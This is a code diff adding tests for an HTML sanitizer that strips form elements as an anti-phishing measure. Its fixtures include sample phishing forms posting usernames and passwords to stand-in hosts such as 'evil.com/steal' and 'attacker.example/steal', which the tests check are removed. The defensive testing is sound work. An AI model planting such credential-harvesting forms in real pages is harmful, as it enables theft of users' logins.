@@ -8,6 +8,7 @@ import {
   transformZennMermaidEmbeds,
   transformZennLinkEmbeds,
 } from '../src/lib/content';
+import { sanitizeHtml } from '../src/lib/html';
 
 /**
  * extractMainContent / detectCharset のロジックを node スクリプトで検証する。
@@ -368,6 +369,58 @@ test.describe('wrapTables — テーブルのレスポンシブラップ', () =>
     expect(wrapTables(html)).toBe(html);
   });
 });
+
+test.describe('sanitizeHtml — フォーム要素のフィッシング対策', () => {
+  test('<form> タグを除去し内部コンテンツは保持する', () => {
+    const html = '<form action="https://evil.com/steal"><p>フォームの説明</p></form>';
+    const result = sanitizeHtml(html);
+    expect(result).not.toContain('<form');
+    expect(result).not.toContain('</form>');
+    expect(result).toContain('フォームの説明');
+  });
+
+  test('<input type="password"> を除去してパスワード詐取を防ぐ', () => {
+    const html = '<p>パスワードを入力してください</p><input type="password" placeholder="パスワード">';
+    const result = sanitizeHtml(html);
+    expect(result).not.toContain('<input');
+    expect(result).toContain('パスワードを入力してください');
+  });
+
+  test('<input type="text"> を除去する', () => {
+    const html = '<input type="text" name="username" placeholder="ユーザー名">';
+    const result = sanitizeHtml(html);
+    expect(result).not.toContain('<input');
+  });
+
+  test('<textarea> 要素を除去する', () => {
+    const html = '<p>説明</p><textarea name="content">テキスト</textarea>';
+    const result = sanitizeHtml(html);
+    expect(result).not.toContain('<textarea');
+    expect(result).toContain('説明');
+  });
+
+  test('<select> 要素を除去する', () => {
+    const html = '<select name="choice"><option>選択肢1</option><option>選択肢2</option></select>';
+    const result = sanitizeHtml(html);
+    expect(result).not.toContain('<select');
+    expect(result).not.toContain('<option');
+  });
+
+  test('フィッシングフォーム全体が無害化される', () => {
+    const html =
+      '<h2>アカウント認証</h2>' +
+      '<form action="https://attacker.example/steal" method="POST">' +
+      '<input type="text" name="user" placeholder="ユーザー名">' +
+      '<input type="password" name="pass" placeholder="パスワード">' +
+      '</form>';
+    const result = sanitizeHtml(html);
+    expect(result).not.toContain('<form');
+    expect(result).not.toContain('<input');
+    expect(result).not.toContain('attacker.example');
+    expect(result).toContain('アカウント認証');
+  });
+});
+
 
 test.describe('extractMainContent 回帰テスト', () => {
   test('article ネスト: 後半本文が切れない', () => {
